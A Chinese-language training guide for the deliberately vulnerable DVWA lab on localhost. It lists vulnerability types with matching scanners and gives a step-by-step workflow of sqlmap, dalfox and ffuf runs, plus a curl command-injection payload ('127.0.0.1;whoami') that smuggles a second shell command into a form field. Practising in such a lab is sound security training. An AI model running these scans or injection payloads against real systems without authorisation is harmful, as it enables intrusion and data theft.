# DVWA — Damn Vulnerable Web Application

> **技术栈**: PHP 5.x + MySQL 5.7 | **访问**: http://localhost:8080
> **默认凭据**: `admin` / `password`

## 漏洞清单

| 漏洞 | 安全等级 | 对应技能 | 工具 |
|:-----|:--------|:---------|:-----|
| SQL Injection | Low→High | `sqli-sql-injection` | sqlmap, nuclei |
| Blind SQLi | Medium→High | `sqli-sql-injection` | sqlmap --technique=B |
| Reflected XSS | Low→High | `xss-cross-site-scripting` | dalfox |
| Stored XSS | Low→High | `xss-cross-site-scripting` | dalfox |
| DOM XSS | Low→High | `dalfox-xss-scanner` | dalfox |
| Command Injection | Low→High | `cmdi-command-injection` | nuclei |
| CSRF | Low→High | `csrf-cross-site-request-forgery` | Burp |
| File Inclusion (LFI) | Low→High | `path-traversal-lfi` | ffuf |
| File Upload | Low→High | `upload-insecure-files` | Burp, ffuf |
| Weak Session IDs | Low→High | `authbypass-authentication-flaws` | Burp |
| Insecure CAPTCHA | Low→High | `business-logic-vulnerabilities` | Burp |
| WAF Bypass (Impossible) | Impossible | `waf-bypass-techniques` | sqlmap tamper |

## 推荐训练流程

```bash
# Step 1: 信息收集
httpx -u http://localhost:8080 -tech-detect -title -status-code

# Step 2: 目录扫描
ffuf -u http://localhost:8080/FUZZ -w config/web-dirs-common.txt -fc 404

# Step 3: SQL 注入 (先调成 Low 等级)
sqlmap -u "http://localhost:8080/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low" --batch

# Step 4: XSS 检测
dalfox url "http://localhost:8080/vulnerabilities/xss_r/" \
  --cookie="PHPSESSID=<YOUR_SESSION>; security=low"

# Step 5: 命令注入
curl "http://localhost:8080/vulnerabilities/exec/" \
  -d "ip=127.0.0.1;whoami&Submit=Submit" \
  -b "PHPSESSID=<YOUR_SESSION>; security=low"
```

## 漏洞专项练习路线

| 周次 | 主题 | DVWA 页面 | 难度递进 |
|:-----|:-----|:----------|:---------|
| 1 | SQL 注入 | `/vulnerabilities/sqli/` | Low → Medium → High |
| 2 | XSS | `/vulnerabilities/xss_r/` + `xss_s/` + `xss_d/` | Low → Medium → High |
| 3 | 命令注入 + LFI | `/vulnerabilities/exec/` + `fi/` | Low → Medium → High |
| 4 | 文件上传 + CSRF | `/vulnerabilities/upload/` + `csrf/` | Low → Medium → High |
| 5 | WAF 绕过 | 切换到 Impossible 等级 | sqlmap tamper 脚本组合 |

## 安全等级切换

在 DVWA 页面左侧菜单 → `DVWA Security` → 选择 `low` / `medium` / `high` / `impossible`
